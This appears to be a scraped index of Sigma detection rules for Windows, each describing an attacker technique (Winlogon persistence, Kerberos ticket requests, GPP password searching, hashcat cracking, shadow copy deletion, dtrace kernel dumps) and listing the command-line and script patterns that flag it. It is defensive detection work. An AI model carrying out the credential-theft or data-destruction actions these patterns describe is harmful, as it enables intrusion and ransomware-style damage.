https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.md#atomic-test-3---winlogon-notify-key-logon-persistence---powershell Raw rule (edit) title: Winlogon Notify Key Logon Persistence id: bbf59793-6efb-4fa1-95ca-a7d288e52c88 description: | Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. author: frack113 date: 2021/12/30 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.md#atomic-test-3---winlogon-notify-key-logon-persistence---powershell logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: \u0026#39;\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\logon\u0026#39; Details|endswith: \u0026#39;.dll\u0026#39; EventType: SetValue condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_winlogon_notify_key.yml/","tags":["attack.persistence","attack.t1547.004"],"title":"Winlogon Notify Key Logon Persistence"},{"categories":null,"contents":"Change outlook email security settings\nKnown false-positives Administrative scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137/T1137.md https://docs.microsoft.com/en-us/outlook/troubleshoot/security/information-about-email-security-settings Raw rule (edit) title: Change Outlook Security Setting in Registry id: c3cefdf4-6703-4e1c-bad8-bf422fc5015a description: Change outlook email security settings author: frack113 date: 2021/12/28 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137/T1137.md - https://docs.microsoft.com/en-us/outlook/troubleshoot/security/information-about-email-security-settings logsource: category: registry_event product: windows detection: selection: TargetObject|contains|all: - \u0026#39;\\SOFTWARE\\Microsoft\\Office\\\u0026#39; - \u0026#39;\\Outlook\\Security\\\u0026#39; EventType: SetValue condition: selection falsepositives: - Administrative scripts level: medium tags: - attack.persistence - attack.t1137 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_outlook_security.yml/","tags":["attack.persistence","attack.t1137"],"title":"Change Outlook Security Setting in Registry"},{"categories":null,"contents":"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.md Raw rule (edit) title: Code Executed Via Office Add-in XLL File id: 36fbec91-fa1b-4d5d-8df1-8d8edcb632ad status: experimental description: | Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.md author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - \u0026#39;new-object \u0026#39; - \u0026#39;-ComObject \u0026#39; - \u0026#39;.application\u0026#39; - \u0026#39;.RegisterXLL\u0026#39; condition: selection falsepositives: - unknown level: high tags: - attack.persistence - attack.t1137.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_office_comobject_registerxll.yml/","tags":["attack.persistence","attack.t1137.006"],"title":"Code Executed Via Office Add-in XLL File"},{"categories":null,"contents":"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain..\nKnown false-positives legitimate administrative script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.md#atomic-test-3---create-a-new-domain-account-using-powershell https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.accountmanagement?view=dotnet-plat-ext-6.0 Raw rule (edit) title: Manipulation of User Computer or Group Security Principals Across AD id: b29a93fb-087c-4b5b-a84d-ee3309e69d08 status: experimental description: | Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain.. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.md#atomic-test-3---create-a-new-domain-account-using-powershell - https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.accountmanagement?view=dotnet-plat-ext-6.0 author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: System.DirectoryServices.AccountManagement condition: selection falsepositives: - legitimate administrative script level: medium tags: - attack.persistence - attack.t1136.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_directoryservices_accountmanagement.yml/","tags":["attack.persistence","attack.t1136.002"],"title":"Manipulation of User Computer or Group Security Principals Across AD"},{"categories":null,"contents":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.011/T1546.011.md#atomic-test-2---new-shim-database-files-created-in-the-default-shim-database-directory Raw rule (edit) title: New Shim Database Created in the Default Directory id: ee63c85c-6d51-4d12-ad09-04e25877a947 status: experimental description: | Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.011/T1546.011.md#atomic-test-2---new-shim-database-files-created-in-the-default-shim-database-directory date: 2021/12/29 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: \u0026#39;.sdb\u0026#39; TargetFilename|contains: \u0026#39;\\Windows\\apppatch\\Custom\\\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1547.009 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_creation_new_shim_database.yml/","tags":["attack.persistence","attack.t1547.009"],"title":"New Shim Database Created in the Default Directory"},{"categories":null,"contents":"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md#atomic-test-4---powershell-cmdlet-scheduled-task https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md#atomic-test-6---wmi-invoke-cimmethod-scheduled-task Raw rule (edit) title: Powershell Create Scheduled Task id: 363eccc0-279a-4ccf-a3ab-24c2e63b11fb status: experimental description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md#atomic-test-4---powershell-cmdlet-scheduled-task - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md#atomic-test-6---wmi-invoke-cimmethod-scheduled-task author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection_cmdlet: ScriptBlockText|contains: - \u0026#39;New-ScheduledTaskAction\u0026#39; - \u0026#39;New-ScheduledTaskTrigger\u0026#39; - \u0026#39;New-ScheduledTaskPrincipal\u0026#39; - \u0026#39;New-ScheduledTaskSettingsSet\u0026#39; - \u0026#39;New-ScheduledTask\u0026#39; - \u0026#39;Register-ScheduledTask\u0026#39; selection_cimmethod: ScriptBlockText|contains|all: - \u0026#39;Invoke-CimMethod\u0026#39; - \u0026#39;-ClassName\u0026#39; - \u0026#39;PS_ScheduledTask\u0026#39; - \u0026#39;-NameSpace\u0026#39; - \u0026#39;Root\\Microsoft\\Windows\\TaskScheduler\u0026#39; condition: 1 of selection_* falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1053.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_cmdlet_scheduled_task.yml/","tags":["attack.persistence","attack.t1053.005"],"title":"Powershell Create Scheduled Task"},{"categories":null,"contents":"Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups\nKnown false-positives legitimate administrative script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md#atomic-test-1---admin-account-manipulate https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/?view=powershell-5.1 Raw rule (edit) title: Powershell LocalAccount Manipulation id: 4fdc44df-bfe9-4fcc-b041-68f5a2d3031c status: experimental description: | Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md#atomic-test-1---admin-account-manipulate - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/?view=powershell-5.1 author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: - \u0026#39;Disable-LocalUser\u0026#39; - \u0026#39;Enable-LocalUser\u0026#39; - \u0026#39;Get-LocalUser\u0026#39; - \u0026#39;Set-LocalUser\u0026#39; - \u0026#39;New-LocalUser\u0026#39; - \u0026#39;Rename-LocalUser\u0026#39; - \u0026#39;Remove-LocalUser\u0026#39; condition: selection falsepositives: - legitimate administrative script level: medium tags: - attack.persistence - attack.t1098 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_localuser.yml/","tags":["attack.persistence","attack.t1098"],"title":"Powershell LocalAccount Manipulation"},{"categories":null,"contents":"utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. A successful execution will output the SPNs for the endpoint in question.\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.md#atomic-test-4---request-a-single-ticket-via-powershell Raw rule (edit) title: Request A Single Ticket via PowerShell id: a861d835-af37-4930-bcd6-5b178bfb54df status: experimental description: | utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. A successful execution will output the SPNs for the endpoint in question. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.md#atomic-test-4---request-a-single-ticket-via-powershell author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: System.IdentityModel.Tokens.KerberosRequestorSecurityToken condition: selection falsepositives: - unknown level: high tags: - attack.credential_access - attack.t1558.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_request_kerberos_ticket.yml/","tags":["attack.credential_access","attack.t1558.003"],"title":"Request A Single Ticket via PowerShell"},{"categories":null,"contents":"Running Chrome VPN Extensions via the Registry install 2 vpn extension\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1133/T1133.md#atomic-test-1---running-chrome-vpn-extensions-via-the-registry-2-vpn-extension Raw rule (edit) title: Running Chrome VPN Extensions via the Registry 2 VPN Extension id: b64a026b-8deb-4c1d-92fd-98893209dff1 description: Running Chrome VPN Extensions via the Registry install 2 vpn extension author: frack113 date: 2021/12/28 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1133/T1133.md#atomic-test-1---running-chrome-vpn-extensions-via-the-registry-2-vpn-extension logsource: category: registry_event product: windows detection: chrome_ext: TargetObject|contains: \u0026#39;Software\\Wow6432Node\\Google\\Chrome\\Extensions\u0026#39; TargetObject|endswith: \u0026#39;update_url\u0026#39; EventType: SetValue chrome_vpn: TargetObject|contains: - fdcgdnkidjaadafnichfpabhfomcebme # ZenMate VPN - fcfhplploccackoneaefokcmbjfbkenj # 1clickVPN - bihmplhobchoageeokmgbdihknkjbknd # Touch VPN - gkojfkhlekighikafcpjkiklfbnlmeio # Hola Free VPN - jajilbjjinjmgcibalaakngmkilboobh # Astar VPN - gjknjjomckknofjidppipffbpoekiipm # VPN Free - nabbmpekekjknlbkgpodfndbodhijjem # Earth VPN - kpiecbcckbofpmkkkdibbllpinceiihk # DotVPN - nlbejmccbhkncgokjcmghpfloaajcffj # Hotspot Shield Free VPN - omghfjlpggmjjaagoclmmobgdodcjboh # Browsec VPN - bibjcjfmgapbfoljiojpipaooddpkpai # VPN-free.pro - mpcaainmfjjigeicjnlkdfajbioopjko # VPN Unlimited Free - jljopmgdobloagejpohpldgkiellmfnc # PP VPN - lochiccbgeohimldjooaakjllnafhaid # IP Unblock - nhnfcgpcbfclhfafjlooihdfghaeinfc # Surf VPN - ookhnhpkphagefgdiemllfajmkdkcaim # iNinja VPN - namfblliamklmeodpcelkokjbffgmeoo # Daily VPN - nbcojefnccbanplpoffopkoepjmhgdgh # Hoxx VPN Proxy - majdfhpaihoncoakbjgbdhglocklcgno # Free VPN - lnfdmdhmfbimhhpaeocncdlhiodoblbd # VPN PROXY MASTER - eppiocemhmnlbhjplcgkofciiegomcon # Urban Free VPN - cocfojppfigjeefejbpfmedgjbpchcng # SaferVPN Proxy - foiopecknacmiihiocgdjgbjokkpkohc # VPN Professional - hhdobjgopfphlmjbmnpglhfcgppchgje # AdGuard VPN - jgbaghohigdbgbolncodkdlpenhcmcge # Free VPN - inligpkjkhbpifecbdjhmdpcfhnlelja # Free One Touch VPN - higioemojdadgdbhbbbkfbebbdlfjbip # Unlimited VPN \u0026amp; Proxy by ibVPN - hipncndjamdcmphkgngojegjblibadbe # RusVPN - iolonopooapdagdemdoaihahlfkncfgg # Azino VPN - nhfjkakglbnnpkpldhjmpmmfefifedcj # Pron VPN - jpgljfpmoofbmlieejglhonfofmahini # Free Residential VPN - fgddmllnllkalaagkghckoinaemmogpe # ExpressVPN - ejkaocphofnobjdedneohbbiilggdlbi # Hotspot Shield Elite VPN Proxy - keodbianoliadkoelloecbhllnpiocoi # Hide My IP VPN - hoapmlpnmpaehilehggglehfdlnoegck # Tunnello VPN - poeojclicodamonabcabmapamjkkmnnk # HMA VPN Proxy Unblocker - dfkdflfgjdajbhocmfjolpjbebdkcjog # Free Avira Phantom VPN - kcdahmgmaagjhocpipbodaokikjkampi # Hola VPN - klnkiajpmpkkkgpgbogmcgfjhdoljacg # Free VPN for Chrome - lneaocagcijjdpkcabeanfpdbmapcjjg # Hub VPN - pgfpignfckbloagkfnamnolkeaecfgfh # Free Proxy VPN - jplnlifepflhkbkgonidnobkakhmpnmh # Private Internet Access - jliodmnojccaloajphkingdnpljdhdok # Turbo VPN for PC - hnmpcagpplmpfojmgmnngilcnanddlhb # Windscribe - ffbkglfijbcbgblgflchnbphjdllaogb # CyberGhost VPN - kcndmbbelllkmioekdagahekgimemejo # VPN.AC - jdgilggpfmjpbodmhndmhojklgfdlhob # Browser VPN - bihhflimonbpcfagfadcnbbdngpopnjb # DEEPRISM VPN - ppajinakbfocjfnijggfndbdmjggcmde # My Browser Vpn - oofgbpoabipfcfjapgnbbjjaenockbdp # SetupVPN - bhnhkdgoefpmekcgnccpnhjfdgicfebm # Wachee VPN - knmmpciebaoojcpjjoeonlcjacjopcpf # Thunder Proxy - dhadilbmmjiooceioladdphemaliiobo # Free Proxy VPN - jedieiamjmoflcknjdjhpieklepfglin # FastestVPN Proxy - mhngpdlhojliikfknhfaglpnddniijfh # WorkingVPN - omdakjcmkglenbhjadbccaookpfjihpa # TunnelBear VPN - npgimkapccfidfkfoklhpkgmhgfejhbj # BelkaVPN - akeehkgglkmpapdnanoochpfmeghfdln # VPN Master - gbmdmipapolaohpinhblmcnpmmlgfgje # Unblock Websites - aigmfoeogfnljhnofglledbhhfegannp # Lethean Proxy VPN - cgojmfochfikphincbhokimmmjenhhgk # Whoer VPN - ficajfeojakddincjafebjmfiefcmanc # Best VPN USA - ifnaibldjfdmaipaddffmgcmekjhiloa # FREE VPN DEWELOPMENT - jbnmpdkcfkochpanomnkhnafobppmccn # apkfold free vpn - apcfdffemoinopelidncddjbhkiblecc # Soul VPN - mjolnodfokkkaichkcjipfgblbfgojpa # DotVPN - oifjbnnafapeiknapihcmpeodaeblbkn # rderzh VPN Proxy - plpmggfglncceinmilojdkiijhmajkjh # Red Panda VPN - mjnbclmflcpookeapghfhapeffmpodij # Ultrareach VPN - bblcccknbdbplgmdjnnikffefhdlobhp # FastStunnel VPN - aojlhgbkmkahabcmcpifbolnoichfeep # VirtualShield VPN - lcmammnjlbmlbcaniggmlejfjpjagiia # Adblock Office VPN Proxy Server - knajdeaocbpmfghhmijicidfcmdgbdpm # Guru VPN \u0026amp; Proxy - bdlcnpceagnkjnjlbbbcepohejbheilk # Malus VPN - edknjdjielmpdlnllkdmaghlbpnmjmgb # Muscle VPN - eidnihaadmmancegllknfbliaijfmkgo # Push VPN - ckiahbcmlmkpfiijecbpflfahoimklke # Gom VPN - macdlemfnignjhclfcfichcdhiomgjjb # Free Fast VPN - chioafkonnhbpajpengbalkececleldf # BullVPN - amnoibeflfphhplmckdbiajkjaoomgnj # HideAll VPN - llbhddikeonkpbhpncnhialfbpnilcnc # ProxyFlow - pcienlhnoficegnepejpfiklggkioccm # Cloud VPN - iocnglnmfkgfedpcemdflhkchokkfeii # sVPN - igahhbkcppaollcjeaaoapkijbnphfhb # Social VPN - njpmifchgidinihmijhcfpbdmglecdlb # Trellonet Trellonet - ggackgngljinccllcmbgnpgpllcjepgc # WindmillVPN - kchocjcihdgkoplngjemhpplmmloanja # IPBurger Proxy \u0026amp; VPN - bnijmipndnicefcdbhgcjoognndbgkep # Veee - lklekjodgannjcccdlbicoamibgbdnmi # Anonymous Proxy Vpn Browser - dbdbnchagbkhknegmhgikkleoogjcfge # Hideman VPN - egblhcjfjmbjajhjhpmnlekffgaemgfh # Fornex VPN - ehbhfpfdkmhcpaehaooegfdflljcnfec # WeVPN - bkkgdjpomdnfemhhkalfkogckjdkcjkg # VPNMatic - almalgbpmcfpdaopimbdchdliminoign # Urban Shield - akkbkhnikoeojlhiiomohpdnkhbkhieh # Prime VPN - gbfgfbopcfokdpkdigfmoeaajfmpkbnh # westwind - bniikohfmajhdcffljgfeiklcbgffppl # Upnet - lejgfmmlngaigdmmikblappdafcmkndb # uVPN - ffhhkmlgedgcliajaedapkdfigdobcif # Nucleus VPN - gcknhkkoolaabfmlnjonogaaifnjlfnp # FoxyProxy Standard - pooljnboifbodgifngpppfklhifechoe # GeoProxy - fjoaledfpmneenckfbpdfhkmimnjocfa # NordVPN - aakchaleigkohafkfjfjbblobjifikek # ProxFlow - dpplabbmogkhghncfbfdeeokoefdjegm # Proxy SwitchySharp - padekgcemlokbadohgkifijomclgjgif # Proxy SwitchyOmega - bfidboloedlamgdmenmlbipfnccokknp # PureVPN condition: all of chrome_* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1133 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_chrome_extension.yml/","tags":["attack.persistence","attack.t1133"],"title":"Running Chrome VPN Extensions via the Registry 2 VPN Extension"},{"categories":null,"contents":"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.md Raw rule (edit) title: Suspicious Screensaver Binary File Creation id: 97aa2e88-555c-450d-85a6-229bcd87efb8 status: experimental description: | Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.md date: 2021/12/29 modified: 2022/01/10 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: \u0026#39;.scr\u0026#39; filter: Image|endswith: - \u0026#39;\\Kindle.exe\u0026#39; - \u0026#39;\\Bin\\ccSvcHst.exe\u0026#39; # Symantec Endpoint Protection condition: selection and not 1 of filter* falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1546.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_creation_scr_binary_file.yml/","tags":["attack.persistence","attack.t1546.002"],"title":"Suspicious Screensaver Binary File Creation"},{"categories":null,"contents":"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md#atomic-test-6---windows-screen-capture-copyfromscreen Raw rule (edit) title: Windows Screen Capture with CopyFromScreen id: d4a11f63-2390-411c-9adf-d791fd152830 status: experimental description: | Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md#atomic-test-6---windows-screen-capture-copyfromscreen author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: \u0026#39;.CopyFromScreen\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.collection - attack.t1113 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_capture_screenshots.yml/","tags":["attack.collection","attack.t1113"],"title":"Windows Screen Capture with CopyFromScreen"},{"categories":null,"contents":"Detects suspicious way to dump the kernel on Windows systems using dtrace.exe, which is available on Windows systems since Windows 10 19H1\nKnown false-positives Unknown References https://twitter.com/0gtweet/status/1474899714290208777?s=12 https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/dtrace Raw rule (edit) title: Suspicious Kernel Dump Using Dtrace id: 7124aebe-4cd7-4ccb-8df0-6d6b93c96795 status: experimental description: Detects suspicious way to dump the kernel on Windows systems using dtrace.exe, which is available on Windows systems since Windows 10 19H1 author: Florian Roth date: 2021/12/28 references: - https://twitter.com/0gtweet/status/1474899714290208777?s=12 - https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/dtrace logsource: product: windows category: process_creation detection: selection_plain: Image|endswith: \u0026#39;\\dtrace.exe\u0026#39; CommandLine|contains: \u0026#39;lkd(0)\u0026#39; selection_obfuscated: CommandLine|contains|all: - \u0026#39;syscall:::return\u0026#39; - \u0026#39;lkd(\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_dtrace_kernel_dump.yml/","tags":null,"title":"Suspicious Kernel Dump Using Dtrace"},{"categories":null,"contents":"Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md#atomic-test-1---gpp-passwords-findstr Raw rule (edit) title: Findstr GPP Passwords id: 91a2c315-9ee6-4052-a853-6f6a8238f90d status: experimental description: Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt. author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md#atomic-test-1---gpp-passwords-findstr date: 2021/12/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\findstr.exe CommandLine|contains|all: - cpassword - \\sysvol\\ - .xml condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1552.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_findstr_gpp_passwords.yml/","tags":["attack.credential_access","attack.t1552.006"],"title":"Findstr GPP Passwords"},{"categories":null,"contents":"Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against\nKnown false-positives Tools that accidentally use the same command line flags and values References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.002/T1110.002.md#atomic-test-1---password-cracking-with-hashcat https://hashcat.net/wiki/doku.php?id=hashcat Raw rule (edit) title: Password Cracking with Hashcat id: 39b31e81-5f5f-4898-9c0e-2160cfc0f9bf status: experimental description: Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.002/T1110.002.md#atomic-test-1---password-cracking-with-hashcat - https://hashcat.net/wiki/doku.php?id=hashcat author: frack113 date: 2021/12/27 logsource: category: process_creation product: windows detection: hashcat_basic: Image|endswith: \\hashcat.exe hashcat_option: CommandLine|contains|all: - \u0026#39;-a \u0026#39; - \u0026#39;-m 1000 \u0026#39; - \u0026#39;-r \u0026#39; condition: 1 of hashcat_* falsepositives: - Tools that accidentally use the same command line flags and values level: critical tags: - attack.credential_access - attack.t1110.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hashcat.yml/","tags":["attack.credential_access","attack.t1110.002"],"title":"Password Cracking with Hashcat"},{"categories":null,"contents":"Uses PowerShell to install a DLL in System32\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.002/T1556.002.md#atomic-test-1---install-and-register-password-filter-dll Raw rule (edit) title: Powershell Install a DLL in System32 id: 63bf8794-9917-45bc-88dd-e1b5abc0ecfd status: experimental description: Uses PowerShell to install a DLL in System32 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.002/T1556.002.md#atomic-test-1---install-and-register-password-filter-dll author: frack113 date: 2021/12/27 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - \u0026#39;Copy-Item \u0026#39; - \u0026#39;-Destination \u0026#39; - \u0026#39;\\Windows\\System32\u0026#39; condition: selection falsepositives: - unknown level: high tags: - attack.credential_access - attack.t1556.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_copy_item_system32.yml/","tags":["attack.credential_access","attack.t1556.002"],"title":"Powershell Install a DLL in System32"},{"categories":null,"contents":"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.md#atomic-test-2---brute-force-credentials-of-single-active-directory-domain-user-via-ldap-against-domain-controller-ntlm-or-kerberos Raw rule (edit) title: Suspicious Connection to Remote Account id: 1883444f-084b-419b-ac62-e0d0c5b3693f status: experimental description: | Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.md#atomic-test-2---brute-force-credentials-of-single-active-directory-domain-user-via-ldap-against-domain-controller-ntlm-or-kerberos author: frack113 date: 2021/12/27 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: - \u0026#39;System.DirectoryServices.Protocols.LdapDirectoryIdentifier\u0026#39; - \u0026#39;System.Net.NetworkCredential\u0026#39; - \u0026#39;System.DirectoryServices.Protocols.LdapConnection\u0026#39; condition: selection falsepositives: - unknown level: low tags: - attack.credential_access - attack.t1110.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_networkcredential.yml/","tags":["attack.credential_access","attack.t1110.001"],"title":"Suspicious Connection to Remote Account"},{"categories":null,"contents":"Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell Raw rule (edit) title: Delete Volume Shadow Copies via WMI with PowerShell id: e17121b4-ef2a-4418-8a59-12fb1631fa9e status: test author: frack113 date: 2021/12/26 description: Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - \u0026#39;Get-WmiObject\u0026#39; - \u0026#39;Win32_Shadowcopy\u0026#39; - \u0026#39;.Delete()\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.impact - attack.t1490 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_susp_win32_shadowcopy.yml/","tags":["attack.impact","attack.t1490"],"title":"Delete Volume Shadow Copies via WMI with PowerShell"},{"categories":null,"contents":"Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-8---windows---disable-the-sr-scheduled-task Raw rule (edit) title: Disable Important Scheduled Task id: 9ac94dc8-9042-493c-ba45-3b5e7c86b980 status: experimental description: Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server. author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-8---windows---disable-the-sr-scheduled-task date: 2021/12/26 logsource: category: process_creation product: windows detection: schtasks_exe: Image|endswith: \\schtasks.exe CommandLine|contains|all: - /Change - /TN - /disable #split to add other schtasks_name: CommandLine|contains: \u0026#39;\\Microsoft\\Windows\\SystemRestore\\SR\u0026#39; condition: all of schtasks_* falsepositives: - Unknown level: high tags: - attack.impact - attack.t1489 